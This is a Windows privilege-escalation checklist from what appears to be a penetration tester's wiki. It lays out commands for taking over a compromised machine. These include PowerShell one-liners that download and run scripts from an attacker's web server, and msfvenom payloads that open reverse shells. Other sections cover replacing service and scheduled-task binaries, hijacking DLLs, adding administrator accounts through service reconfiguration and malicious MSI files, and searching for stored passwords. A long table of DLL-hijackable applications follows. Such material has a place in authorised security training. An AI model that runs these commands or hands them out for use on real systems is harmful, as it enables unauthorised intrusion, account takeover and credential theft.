<!-- TITLE: Windows -->
<!-- SUBTITLE: Windows privilege escalation checklist -->

Windows Privilege escalation was one thing I struggled with, it was easy enough to get a shell but what next? I am just a normal user. Where do I start, what to look for, I guess these are questions that come to your mind when you want to escalate. Well this is the methodology which I follow for privilege escalation. Again this is only my flow and yours may be different, follow what works best for you.

Okay once I get my shell, I want to escalate as quickly as possible without wasting too much time so I run the scripts, find exactly what needs to be done and exploit it. I would suggest you to try out all the manual methods first before using automated scripts or you will not know which tool gives which data. Once you know that go for the automated scripts.

Remember each script has different formats and check for different things so know what exactly the scripts are doing before running them. I would suggest to use `wget.vbs` for transferring files from linux to windows as that always worked for me.

# Automated Scripts

## Scripts
Script 1: [Windows-Privesc-Check by Pentestmonkey](https://github.com/pentestmonkey/windows-privesc-check/blob/master/windows-privesc-check2.exe)
Script 2: [Windows Exploit Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
Script 3: [WinPrivCheck.bat](https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)
Script 4: [Powerup.ps1 from Powersploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)
Script 5: [Sherlock.ps1 by Rasta-mouse](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)

### Sherlock & PowerUp

These one-liners download the script from your web server and run it directly on the victim machine.

    c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/PowerUp.ps1') ; Invoke-AllChecks"  
    c:\>powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/powerup.ps1') ; Invoke-AllChecks"
    c:\>powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://192.168.1.2:8000/Sherlock.ps1') ; Find-AllVulns"

Execution from the target directly:

    c:\>powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
    c:\>powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"

I always prefer the one-liners, clean and simple, but you might lose your shell after executing it.

## Kernel Exploits
Analyse script 2 and 5.

Get the exploit-db number and replace it in `step 1` to get the code and compile it on your own, or once you have the exploit-db number you can directly get the precompiled exploit by using the number in `step 2`

1. https://www.exploit-db.com/exploits/"Exploit-db-Number"/
2. https://github.com/offensive-security/exploit-database-bin-sploits/find/master/"Exploit-db-Number"
3. https://github.com/abatchy17/WindowsExploits/

So by this time either we have high privilege or we know what is the exact vulnerability to exploit to get our privilege.


# Privilege Escalation Checklist

## System information

Understanding what system will help you to better visualise if your exploits will work or not since some features are available for older versions of OS and not in the later and vice versa.

    # Check for missing hotfixes (NA) etc.
    systeminfo

    # System hostname
    hostname

    # Current user
    echo %username%

    # List local users on the machine
    net users

    # Who's a member of the local administrators group?
    net localgroup administrators

    Check for any services bound to the local interface
    netstat -ano

    Are we dealing with any firewall restrictions (netsh XP SP2 an above)
    netsh firewall show config

    Check scheduled tasks and which services are mapped to them
    schtasks /query /fo LIST /v

    Folder: \Microsoft\Windows Defender
    HostName:                             B33F
    TaskName:                             \Microsoft\Windows Defender\MP Scheduled Scan
    Next Run Time:                        1/22/2014 5:11:13 AM
    Status:                               Ready
    Logon Mode:                           Interactive/Background
    Last Run Time:                        N/A
    Last Result:                          1
    Author:                               N/A
    Task To Run:                          c:\program files\windows defender\MpCmdRun.exe Scan -ScheduleJob
                                          -WinTask -RestrictPrivilegesScan
    Start In:                             N/A
    Comment:                              Scheduled Scan
    Scheduled Task State:                 Enabled
    Idle Time:                            Only Start If Idle for 1 minutes, If Not Idle Retry For 240 minutes
    Power Management:                     No Start On Batteries
    Run As User:                          SYSTEM
    Delete Task If Not Rescheduled:       Enabled
    Stop Task If Runs X Hours and X Mins: 72:00:00
    Schedule:                             Scheduling data is not available in this format.
    Schedule Type:                        Daily
    Start Time:                           5:11:13 AM
    Start Date:                           1/1/2000
    End Date:                             1/1/2100
    Days:                                 Every 1 day(s)
    Months:                               N/A
    Repeat: Every:                        Disabled
    Repeat: Until: Time:                  Disabled
    Repeat: Until: Duration:              Disabled
    Repeat: Stop If Still Running:        Disabled
    [..Snip..]

    # The following command links running processes to services
    tasklist /SVC

    Image Name                     PID Services
    ========================= ======== ============================================
    System Idle Process              0 N/A
    System                           4 N/A
    smss.exe                       244 N/A
    csrss.exe                      332 N/A
    csrss.exe                      372 N/A
    wininit.exe                    380 N/A
    winlogon.exe                   428 N/A
    services.exe                   476 N/A
    lsass.exe                      484 SamSs
    lsm.exe                        496 N/A
    svchost.exe                    588 DcomLaunch, PlugPlay, Power
    svchost.exe                    668 RpcEptMapper, RpcSs
    svchost.exe                    760 Audiosrv, Dhcp, eventlog,
                                       HomeGroupProvider, lmhosts, wscsvc
    svchost.exe                    800 AudioEndpointBuilder, CscService, Netman,
                                       SysMain, TrkWks, UxSms, WdiSystemHost,
                                       wudfsvc
    svchost.exe                    836 AeLookupSvc, BITS, gpsvc, iphlpsvc,
                                       LanmanServer, MMCSS, ProfSvc, Schedule,
                                       seclogon, SENS, ShellHWDetection, Themes,
                                       Winmgmt, wuauserv
    audiodg.exe                    916 N/A
    svchost.exe                    992 EventSystem, fdPHost, netprofm, nsi,
                                       WdiServiceHost, WinHttpAutoProxySvc
    svchost.exe                   1104 CryptSvc, Dnscache, LanmanWorkstation,
                                       NlaSvc
    spoolsv.exe                   1244 Spooler
    svchost.exe                   1272 BFE, DPS, MpsSvc
    mDNSResponder.exe             1400 Bonjour Service
    taskhost.exe                  1504 N/A
    taskeng.exe                   1556 N/A
    vmtoolsd.exe                  1580 VMTools
    dwm.exe                       1660 N/A
    explorer.exe                  1668 N/A
    vmware-usbarbitrator.exe      1768 VMUSBArbService
    TPAutoConnSvc.exe             1712 TPAutoConnSvc
    [..Snip..]


## User files and access

## Kernel exploits

Checking current path level manually:

`wmic qfe get Caption,Description,HotFixID,InstalledOn`

    Caption                                     Description      HotFixID   InstalledOn
    http://support.microsoft.com/?kbid=2727528  Security Update  KB2727528  11/23/2013
    http://support.microsoft.com/?kbid=2729462  Security Update  KB2729462  11/26/2013
    http://support.microsoft.com/?kbid=2736693  Security Update  KB2736693  11/26/2013
    http://support.microsoft.com/?kbid=2737084  Security Update  KB2737084  11/23/2013
    http://support.microsoft.com/?kbid=2742614  Security Update  KB2742614  11/23/2013
    http://support.microsoft.com/?kbid=2742616  Security Update  KB2742616  11/26/2013
    http://support.microsoft.com/?kbid=2750149  Update           KB2750149  11/23/2013
    http://support.microsoft.com/?kbid=2756872  Update           KB2756872  11/24/2013
    http://support.microsoft.com/?kbid=2756923  Security Update  KB2756923  11/26/2013
    http://support.microsoft.com/?kbid=2757638  Security Update  KB2757638  11/23/2013
    http://support.microsoft.com/?kbid=2758246  Update           KB2758246  11/24/2013
    http://support.microsoft.com/?kbid=2761094  Update           KB2761094  11/24/2013
    http://support.microsoft.com/?kbid=2764870  Update           KB2764870  11/24/2013
    http://support.microsoft.com/?kbid=2768703  Update           KB2768703  11/23/2013
    http://support.microsoft.com/?kbid=2769034  Update           KB2769034  11/23/2013
    http://support.microsoft.com/?kbid=2769165  Update           KB2769165  11/23/2013
    http://support.microsoft.com/?kbid=2769166  Update           KB2769166  11/26/2013
    http://support.microsoft.com/?kbid=2770660  Security Update  KB2770660  11/23/2013
    http://support.microsoft.com/?kbid=2770917  Update           KB2770917  11/24/2013
    http://support.microsoft.com/?kbid=2771821  Update           KB2771821  11/24/2013
    [..Snip..]

As always with Windows, the output isn't exactly ready for use. The best strategy is to look for privilege escalation exploits and look up their respective KB patch numbers. Such exploits include, but are not limited to, KiTrap0D (KB979682), MS11-011 (KB2393802), MS10-059 (KB982799), MS10-021 (KB979683), MS11-080 (KB2592799). After enumerating the OS version and Service Pack you should find out which privilege escalation vulnerabilities could be present. Using the KB patch numbers you can grep the installed patches to see if any are missing.

`wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB.." /C:"KB.."`

See [Windows Kernel Exploit Table](windows-exploit-table.md) for a full list of kernel privilege escalation exploits and use `systeminfo` to guide on installed hotfixes with the above command to get an overall view of the targets current patch level and which exploits may be applicable.

## Cleartext passwords

Search all these files for passwords. Don’t miss out on easy escalations. Once you get the password it's just a matter of PsExec to give yourself admin privileges.

    c:\unattended.txt
    c:\sysprep.inf
    c:\sysprep\sysprep.xml
    %WINDIR%\Panther\Unattend\Unattended.xml
    %WINDIR%\Panther\Unattended.xml
    Vnc.ini
    ultravnc.ini
    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
    Services\Services.xml
    ScheduledTasks\ScheduledTasks.xml
    Printers\Printers.xml
    Drives\Drives.xml
    DataSources\DataSources.xml

You can also use `pwdump` and `fgdump` to dump out passwords.

### Searching the filesystem and registry
```
dir /s *pass* == *cred* == *vnc* == *.config*
findstr /si password *.xml *.ini *.txt
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```


## Scheduled tasks

Read the output of scheduled tasks and check the following:

    schtasks /query /fo LIST /v

1. Run as User: system

If you get any as system then go through that in detail to find the "Task to Run", time and schedules.
Based on "Task to run", check the access permission of that folder and file.

    accesschk.exe -dqv "E:\getLogs"

2. If it has readwrite(RW) for authenticated users then we can overwrite the file it's trying to run as system with our payload.

3. Generate payload

    msfvenom windows/shell_reverse_tcp lhost='127.0.0.1' lport='1337'  -f  exe > /root/Desktop/evil-log.exe copy evil-log.exe E:\getLogs\log.exe

4. Overwrite it.  Open a listener and wait for it to run and grab a shell as system.

You will need to take time to examine ALL the binary paths for the windows services, scheduled tasks and startup tasks.

The below are checked by winprivesc/powerup so you should get it in the powershell output, but have to learn the manual methods too.

Reference: https://toshellandback.com/2015/11/24/ms-priv-esc/


## Unquoted service paths

If there is a service with a path that has space in it and is also unquoted then make a file.exe with the file name as the first name before the space and restart the service.

Commands to check the service name and path:

    # Find unquoted paths
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """

    # Make sure you have permission to edit/put files in the folders using icacls
    icacls "C:\Program Files (x86)\<Folder name>"
    cacls "C:\Programs Files\foldername"
    accesschk.exe -dqv "C:\Program Files\foldername"

    # Start and stop service
    sc stop <service-name>
    sc start <service-name>

    # Reboot
    shutdown /r /t 0

## Service Permissions

What we are interested in is binaries that have been installed by the user. In the output you want to look for BUILTIN\Users:(F). Or where your user/usergroup has (F) or (C) rights.

    icacls "C:\path\to\file.exe"

Example Output:

    C:\path\to\file.exe
    BUILTIN\Users:F
    BUILTIN\Power Users:C
    BUILTIN\Administrators:F
    NT AUTHORITY\SYSTEM:F

That means your user has write access. So you can just rename the .exe file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.

Here is a POC code for getsuid.

```c
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators theusername /add");
return 0;
}
```
We then compile it with `mingw` like this:

    i686-w64-mingw32-gcc winexp.c -lws2_32 -o exp.exe

Move the exploit binary in place of the original binary file.

Now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using wmic or net the following way:

    wmic service NAMEOFSERVICE call startservice
    net stop [service name] && net start [service name].

The binary should now be executed in the SYSTEM or Administrator context.

### Reconfiguring the service binpath

This works by replacing 'binpath' property.

    accesschk.exe -uwcqv "Authenticated Users" * /accepteula
    accesschk.exe -qwcu "Users" *
    accesschk.exe -qwcu "Everyone" *

You must get a **'RW' with SERVICE_ALL_ACCESS**

    sc qc <service-name>
    sc config <service-name> binpath= "net user virgil P@ssword123! /add"
    sc config upnphost obj=".\LocalSystem" password=""
    sc stop <service-name>
    sc start <service-name>
    sc config <service-name> binpath= "net localgroup Administrators virgil /add"
    sc stop <service-name>
    sc start <service-name>

This should add a new user to administrators group. Try it when you have upnphost service.

> This can also be used to get reverse shell as SYSTEM

## Elevated installs

If the two registry values are set to 1, we can install a malicious msi file.

    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Generate shell code:

    msfvenom -p windows/adduser USER=virgil PASS=P@ssword123! -f msi -o exploit.msi
    msfvenom -f msi-nouac -p windows/exec cmd="C:\Users\testuser\AppData\Local\Temp\Payload.exe" > exploit.msi

Running the malicious MSI:

    msiexec /quiet /qn /i C:\Users\Virgil\Downloads\exploit.msi


## DLL Hijacking

If an application loads a DLL and it does not give a fully qualified path, Windows will search for the dll in a particular order and execute it if it finds it.

1. The directory from which the application loaded
2. 32-bit System directory (C:\Windows\System32)
3. 16-bit System directory (C:\Windows\System)
4. Windows directory (C:\Windows)
5. The current working directory (CWD)
6. Directories in the PATH environment variable (system then user)

### Example

    # This is on Windows 7 as low privilege user1.

    C:\Users\user1\Desktop> echo %username%

    user1

    # We have a win here since any non-default directory in "C:\" will give write access to authenticated
    users.

    C:\Users\user1\Desktop> echo %path%

    C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;
    C:\Program Files\OpenVPN\bin;C:\Python27

    # We can check our access permissions with accesschk or cacls.

    C:\Users\user1\Desktop> accesschk.exe -dqv "C:\Python27"

    C:\Python27
      Medium Mandatory Level (Default) [No-Write-Up]
      RW BUILTIN\Administrators
            FILE_ALL_ACCESS
      RW NT AUTHORITY\SYSTEM
            FILE_ALL_ACCESS
      R  BUILTIN\Users
            FILE_LIST_DIRECTORY
            FILE_READ_ATTRIBUTES
            FILE_READ_EA
            FILE_TRAVERSE
            SYNCHRONIZE
            READ_CONTROL
      RW NT AUTHORITY\Authenticated Users
            FILE_ADD_FILE
            FILE_ADD_SUBDIRECTORY
            FILE_LIST_DIRECTORY
            FILE_READ_ATTRIBUTES
            FILE_READ_EA
            FILE_TRAVERSE
            FILE_WRITE_ATTRIBUTES
            FILE_WRITE_EA
            DELETE
            SYNCHRONIZE
            READ_CONTROL

    C:\Users\user1\Desktop> cacls "C:\Python27"

    C:\Python27 BUILTIN\Administrators:(ID)F
                BUILTIN\Administrators:(OI)(CI)(IO)(ID)F
                NT AUTHORITY\SYSTEM:(ID)F
                NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(ID)F
                BUILTIN\Users:(OI)(CI)(ID)R
                NT AUTHORITY\Authenticated Users:(ID)C
                NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(ID)C

    # Before we go over to action we need to check the status of the IKEEXT service. In this case we can see
    it is set to "AUTO_START" so it will launch on boot!

    C:\Users\user1\Desktop> sc qc IKEEXT

    [SC] QueryServiceConfig SUCCESS

    SERVICE_NAME: IKEEXT
            TYPE               : 20  WIN32_SHARE_PROCESS
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k netsvcs
            LOAD_ORDER_GROUP   :
            TAG                : 0
            DISPLAY_NAME       : IKE and AuthIP IPsec Keying Modules
            DEPENDENCIES       : BFE
            SERVICE_START_NAME : LocalSystem

    # Generate a malicious DLL payload
    msfpayload windows/shell_reverse_tcp lhost='127.0.0.1' lport='9988' D > /root/Desktop/evil.dll

    # Copy to target
    copy evil.dll C:\Python27\wlbsctrl.dll
    
    # After transferring the DLL to our target machine all we need to do is rename it to wlbsctrl.dll and move it to "C:\Python27". Once this is done we need to wait patiently for the machine to be rebooted (or we can try to force a reboot) and we will get a SYSTEM shell.

### Vulnerable Windows services

Vulnerable Windows Services

| Windows Version | Service | Vulnerable DLL |
| :--- | :--- | :--- | :--- |
| Windows XP | Automatic Updates (wuauserv) | ifsproxy.dll |
| - | Remote Desktop Help Session Manager (RDSessMgr) | SalemHook.dll |
| - | Remote Access Connection Manager (RasMan) | pbootp.dll |
| - | Windows Management Instrumentation (winmgmt) | wbemcore.dll |
| - | Audio Service (STacSV) | SFFXComm.dll and SFCOM.DLL |
| - | Intel(R) Rapid Storage Technology (IAStorDataMgrSvc) | DriverSim.dll |
| - | Juniper Unified Network Service(JuniperAccessService) | dsLogService.dll |
| - | Encase Enterprise Agent | SDDisk.dll |
| Windows 7 (32/64) | IKE and AuthIP IPsec Keying Modules (IKEEXT) | wlbsctrl.dll |
| Windows 8 | NA | NA |

### DLL Hijacking Table

| **Application** | **Version** |
| :--- | :--- |
| **ADOBE** | - |
| **Adobe Captivate** (cp, cpt, cprr, cptl, fcz, rd, rdt) *(winpens.dll)* | 3 |
| **Adobe Dreamweaver** (mfc90loc.dll, mfc90ptb.dll(lang-dependent))* | [CS4](http://www.exploit-db.com/exploits/14735) (<= 10.0 build 4117)<br> [CS5](http://www.exploit-db.com/exploits/14740) (<= 11.0 build 4909) |
| **Adobe ExtendedScript Toolkit***(dwmapi.dll)* | [CS5 v3.5.0.52](http://www.exploit-db.com/exploits/14785/) |
| **Adobe Extension Manager (mxi,mxp)***(dwmapi.dll)* | [CS5 v5.0.298](http://www.exploit-db.com/exploits/14784/) |
| **Adobe Photoshop***(wintab32.dll)* | [CS2](http://www.exploit-db.com/exploits/14741) |
| **Adobe Fireworks** | CS3, CS4 and CS5 |
| **Adobe Device Central***(qtcf.dll)* | [CS5](http://www.exploit-db.com/exploits/14755) |
| **Adobe Illustrator (ait, eps)***(aires.dll)* | [CS4 v14.0.0](http://www.exploit-db.com/exploits/14773/) |
| **Adobe On Location (olproj)***(ibfs32.dll)* | [CS4 build 315](http://www.exploit-db.com/exploits/14772/) |
| **Adobe Indesign (indl, indp, indt, inx)***(ibfs32.dll)* | [CS4 v6.0](http://www.exploit-db.com/exploits/14775/) |
| **Adobe Premier (pproj, prfpset, prexport, prm, prmp, prpreset, prproj, prsl, prtl, vpr)***(ibfs32.dll)* | Pro CS4 314 |
| **Adobe Audition (audition.exe) (cdl, cel, dbl, dwd, pcm, sam, ses, smp, svx, vox)***(assist.dll, ff_theora.dll, quserex.dll, skl_drv_mpg.dll)* | 3.0.7283.0 (Win7 x64) |
| **ALLADIN** | - |
| **Aladdin eToken PKI Client (etc, etcp)***(wintab32.dll)* | 5.0.0.65 |
| **AlTools** | - |
| **AlZip (all associated archive file formats)***(mfc90*.dll, propsys.dll)* | <= 8.0.6.3 |
| **AlSee (ani, bmp, cal, hdp, jpe, mac, pbm, pcx, pgm, png, psd, ras, tga, tiff)***(patchani.dll)* | <= 6.20.0.1 |
| **APPLE** | - |
| **Safari***(dwmapi.dll)* | [<= 5.0.1](http://www.exploit-db.com/exploits/14756) |
| **Quicktime Player (mac, pic, pntg, qtif)***(cfnetwork.dll, corefoundation.dll)* | <= 7.64.17.13 |
| **ARCHICAD** | - |
| **ArchiCAD***(srcsrv.dll)* | 13.0 |
| **AVAST** | - |
| **Avast! (license file .avastlic)***(mfc90loc.dll)* | [<= 5.0.594](http://www.exploit-db.com/exploits/14743) |
| **AVISCREEN** | - |
| **Aviscreen Pro (just a lnk file to the app will do)***(iccvid.dll, ir32_32.dll, yuv_32.dll, msrle32.dll, msvidc32.dll, msyuv.dll, tsbyuv.dll, iacenc.dll, tsbyuv.dll)* | 3.1 |
| **BITMANAGEMENT** | - |
| **BS Contact VRML/X3D (bskey, bswrl, bxwrl, j2k, jp2, vrml, wrl, wrz, x3dvz, x3dv, x3dz, x3d)***(d3dref9.dll, siappdll.dll)* | <= 7.218 |
| **BRAVA** | - |
| **Brava PDF Reader (csf, pdf, sid, tiff, tif, xdl, xps)***(dwmapi.dll)* | <= 3.3.0.18 |
| **BREAKPOINT** | - |
| **HexWorkshop***(pe932d.dll, pe936d.dll, pegrc32d.dll)* | 6.0.1.460.3 |
| **BS.Player** | - |
| **BS.player (mp3)***(mfc71loc.dll, ehtrace.dll)* | [<= 2.56](http://www.exploit-db.com/exploits/14739) |
| **CAMTASIA** | - |
| **Camtasia Studio (cmmp,cmmtpl,camproj,camrec)***(dwmapi.dll)* | <= 6 build 689 |
| **Camtasia Studio***(mfc90*.dll)* | 7 |
| **CDISPLAY** | - |
| CDisplay (cba, cbr, cbt, cbz)*(trace32.dll)* | 1.8.10 |
| **CELFRAME** | - |
| **CelFrame Office Write (doc)***(java_msci.dll, msci_java.dll)* | Office Suite 2008 |
| **CelFrame Office Spreadsheet (xls)***(java_msci.dll, msci_java.dll)* | Office Suite 2008 |
| **CelFrame Office Publisher (sla)***(wintab32.dll)* | Office Suite 2008 |
| **CelFrame Office Draw (odg)**(*(java_msci.dll, msci_java.dll)* | Office Suite 2008 |
| **CelFrame Office Photo Album (plx)***(wintab32.dll)* | Office Suite 2008 |
| **CISCO** | - |
| **Cisco Packet Tracer (pkt, pkz)***(wintab32.dll)* | [5.2](http://www.exploit-db.com/exploits/14774/) |
| **CITRIX** | - |
| **Citrix ICA Client- (ica)**(pncachen.dll, wfapi.dll) | <= v9.0.32649.0 |
| **COREL** | - |
| **Corel Draw (cmx,csl)***(crlrib.dll)* | [<= X3 v13.0.0.576](http://www.exploit-db.com/exploits/14786/) |
| **Corel PhotoPaint (cpt)***(crlrib.dll)* | [<= X3 v13.0.0.576](http://www.exploit-db.com/exploits/14787/) |
| **CYBERLINK** | - |
| **PowerDirector (iso, pdl, p2g, p2i)***(mfc71*.dll)* | [7](http://extraexploit.blogspot.com/2010/08/dll-hijacking-my-test-cases-on-default.html) |
| **Power2Go DVD (iso, pdl, p2g, p2i)***(mfc71*.dll)* | [6](http://extraexploit.blogspot.com/2010/08/dll-hijacking-my-test-cases-on-default.html) |
| **DAEMON TOOLS** | - |
| **DAEMON Tools Lite (mdf, mds, mdx)***(mfc80loc.dll)* | [4.35.6.0091](http://www.exploit-db.com/exploits/14791) |
| **DVDFAB** | - |
| **DVDFab Platinum (dvdfab5, dvdfabplatinum5, dvdfabgold5, dvdfabmobile)***(quserex.dll)* | 5.2.3.2 |
| **DVDFab (dvdfab6, dvdfab*2*, dbdfabfilemover)***(dwmapi.dll,mfc90*.dll,nvcuda.dll,quserex.dll)* | 7.0.4.0 |
| **E-PRESS** | - |
| **E-Press ONE Office Author (psw)***(java_mcsi.dll, mcsi_java.dll)* | - |
| **E-Press ONE Office E-NoteTaker (txt)***(mfc71*.dll)* | - |
| **E-Press ONE Office E-Zip (rar, tar)***(mfc71*.dll)* | - |
| **GDOC** | - |
| **gDoc Fusion (dwfx, jtx, pdf, xps)***(wintab32.dll, ssleay32.dll)* | <= 2.5.1 |
| **GUIDANCE** | - |
| **Encase (endump)***(rsaenh.dll)* | [<= 6.17.0.90](http://www.s3cur1ty.de/m1adv2010-003) |
| **ETTERCAP** | [<= NG 0.7.3](http://www.exploit-db.com/exploits/14762) |
| **Ettercap***(wpcap.dll)* | - |
| **EZBSYSTEMS** | - |
| **Ultra ISO***(daemon.dll)* | Premium 9.36 |
| **FORENSIC TOOLKIT** | - |
| **Forensic Toolkit (ftk)** | [<= v1.8.1.6](http://www.s3cur1ty.de/m1adv2010-007) |
| **FOTOBOOK** | - |
| **Fotobook Editor (dtp)***(fwpuclnt.dll)* | [5.0 v2.8.0.1](http://antisecurity.org/sploit/fotobook_dll.zip) |
| **GFI** | - |
| **GFI Backup (gbc,gbt)***(armaccess.dll)* | 2009 Home Edition |
| **GILLES VOLLANT** | - |
| **WinImage (bzw, dsk, img, imz, iso, vfd, wil, wlz)***(wnaspi32.dll)* | 8.0.0.8000 (win7 x64) |
| **GOOGLE** | - |
| **Google Chrome***(chrome.dll)* | latest |
| **Google Earth (kmz)***(quserex.dll)* | <= [v5.1.3535.3218](http://www.exploit-db.com/exploits/14790/) |
| **HTTRACK** | - |
| **WinHTTrack Website Copier (whtt)***(mfc71enu.dll, mfc71loc.dll)* | 3.43-7 |
| **IBM** | - |
| **Lotus Notes client (ndl,ns2,ns3,nsf,nsg,nsh,ntf)***(kernel32.dll)* | 5.0.12 |
| **IBM Rational License Key Administrator (upd)***(ibfs32.dll)* | [< 7.0.0.0 (fixed in 7.0.0.0)](http://www.s3cur1ty.de/m1adv2010-006) |
| **Lotus Symphony Office Suite (odm, odt, otp, stc, stw, sxg, sxw)***(eclipse_1114.dll)* | <= 3 beta 4 |
| **IDM COMPUTER SOLUTIONS** | - |
| **UltraEdit (bin, cpp, css, c, dat, hpp, html, h, ini, java, log, mak, php, prj, txt, xml)***(dwmapi.dll)* | <= 16.10.0.1036 |
| **INKSCAPE** | - |
| **Inkscape (svgz)***(quserex.dll)* | <= 0.48.0 r9654 |
| **INTERVIDEO** | - |
| **Intervideo WinDVD***(cpqdvd.dll)* | [5](http://www.exploit-db.com/exploits/14753) |
| **INTUIT** | - |
| **Quickbooks (des,qbo,qpg)***(dbicudtx11.dll, mfc90enu.dll, mfc90loc.dll)* | Pro 2010 |
| **IZARC** | - |
| **IZArc (all archive formats)***(ztv7z.dll)* | <= 4.1.2 |
| **JUNIPER / NCP** | - |
| **NCP Secure Client (pcf, spd, wge, wgx)***(dvccsabase002.dll, conman.dll, kmpapi32.dll)* | <= 9.23.017 |
| **NCP Secure Entry Client (pcf, spd, wge, wgx)***(conman.dll, dvccsabase002.dll, kmpapi32.dll, ncpmon2.dll)* | <= 9.23.017 |
| **KEEPASS** | - |
| **KeePass Password Safe (kdb)***(bcrypt.dll)* | <= 1.15**(fixed in 1.18)** |
| **KeePass Password Safe (kdbx)***(*dwmapi.dll, bcrypt.dll*)* | <= 2.12**(fixed in 2.13)** |
| **KINETI** | - |
| **Kineti Count (kcp)***(dwmapi.dll)* | [1.0 beta](http://antisecurity.org/sploit/kineticount_dll.zip) |
| **KINGSOFT** | - |
| **Kingsoft Office Writer (doc, rtf)***(plgpf.dll)* | 2010 |
| **Kingsoft Office Presentation (ppt)***(lpgpf.dll)* | 2010 |
| **Kingsoft Office Spreadsheets (xls)***(plgpf.dll)* | 2010 |
| **MAXTHON** | - |
| **Maxthon Browser (htm, html, mhtml)***(dwmapi.dll)* | 2.5.15.1000 Unicode |
| **MEDIAMONKEY** | - |
| **Mediamonkey (apl, fla, m4b, mmip, mp+, mpp)***(dwmapi.dll)* | 3.2.0.1294 |
| **MEDIA PLAYER** | - |
| **Mediaplayer Classic mpc*** (all formats)(iacenc.dll)* | [<= 1.3.2189.0](http://www.exploit-db.com/exploits/14765) |
| **Media Player Classic (3gp, 3gp2, flv, m4b, m4p, m4v, mp4, spl)***(ehtrace.dll, iacenc.dll)* | [<= v6.4.9.x](http://www.exploit-db.com/exploits/14788) |
| **MICROCHIP** | - |
| **mplab IDE (mcp,mcw)***(mfc71*.dll)* | 8.43 |
| **MICROSOFT** | - |
| **MS Powerpoint (odp,pot,potm,pptx,ppt,ppa,pps,ppsm,ppsx,pptm,pwz,sldm,sldx)***(2003 : ophookse4.dll)(pptimpconv.dll, pp7x32.dll,rpawinet.dll) -- verified on 32 & 64bit* | 2003[2007](http://www.exploit-db.com/exploits/14782/)[2010](http://www.exploit-db.com/exploits/14723) |
| **MS Word (docx)***(rpawinet.dll)* | 2007 |
| **MS Virtual PC** **(vmc)***(midimap.dll)* | 2007 |
| **Ms Visio (vtx -- 2003, vss -- 2010)***(2003 -- mfc71enu.dll, 2010 -- dwmapi.dll)* | [2003](http://www.exploit-db.com/exploits/14744)2010 |
| **MS Office Groove (wav, p7c)***(mso.dll)* | [2007](http://www.exploit-db.com/exploits/14746) |
| **MS Windows Mail (nws)***(wab32res.dll)* | - |
| **MS Windows Live Email (eml,rss)***(dwmapi.dll, peerdist.dll)* | [<= 14.0.8089.726](http://www.exploit-db.com/exploits/14728) |
| **MS Movie Maker (flv, icon, mkv, mqv, mswmn, ogg, qt, wlmp)***(hhctrl.ocx)* | [<= 2.6.4038.0](http://www.exploit-db.com/exploits/14731) |
| **MS Vista Backup Manager (.wbcat)***(fveapi.dll)* | - |
| **MS Internet Connection Signup Wizard***(smmscrpt.dll)* | [latest](http://www.exploit-db.com/exploits/14754) |
| **MS Internet Communication Settings (isp)***(schannel.dll)* | [latest](http://www.exploit-db.com/exploits/14780/) |
| **MS Group Convertor (grp)***(imm.dll)* | [latest](http://www.exploit-db.com/exploits/14758/) |
| **MS Clip Organizer (mpf)***(twcgst.dll)* | <= 11.8164.8324 (XP SP3) |
| **MS Clip Book Viewer***(mfaphook.dll)* | - |
| **MS Snapshot viewer (snp)***(mfc71enu.dll, mfc71loc.dll)* | 11 |
| **Windows Program Group / grpconv.exe (grp)***(imm.dll)* | [latest](http://www.exploit-db.com/exploits/14770) |
| **MS Windows Address Book wab.exe/Contacts (wab, p7c, contact, group, vcf)***(wab32res.dll)* | [XP](http://www.exploit-db.com/exploits/14745/), [Vista](http://www.exploit-db.com/exploits/14778/)silently patched on Win7 |
| **MS RDP Client (rdp)***(dwmapi.dll -- Win7, ieframe.dll -- XPSP3)* | v6.1.7600.16385 (Win7)v6.0.6001.18000 (XP SP3) |
| **MS Visual Studio devenv.exe (cur, rs, rct, res)***(NULL.dll)* | 2008 |
| **wscript (jse) / (js, vbs)***(wshfra.dll) (traceapp.dll)* | [XP version](http://www.exploit-db.com/exploits/14794/) |
| **MS Windows Media Encoder (prx)***(wmerrorenu.dll, winietenu.dll, asferrorenu.dll)* | 9.00.00.2980 |
| **MS ATL Trace Tool (atltracetool8.exe) (trc)***(dwmapi.dll)* | 10.0.30319.1 |
| **MS DirectShow SDK Filter Graph Editor (grf)***(ehtrace.dll, measure.dll)* | 10.0.0.0 (Win7 x64) |
| **MS Help & Support Center***(wshfra.dll)* | - |
| **MS Live Writer (wpost)***(peerdist.dll)* | <= 14.0.8089.726 |
| **MOOVIDA** | - |
| **Moovida Media Player (f4v, flv, img, dv)***(libc.dll, quserex.dll)* | <= 2.0.0.15 |
| **MOZILLA** | - |
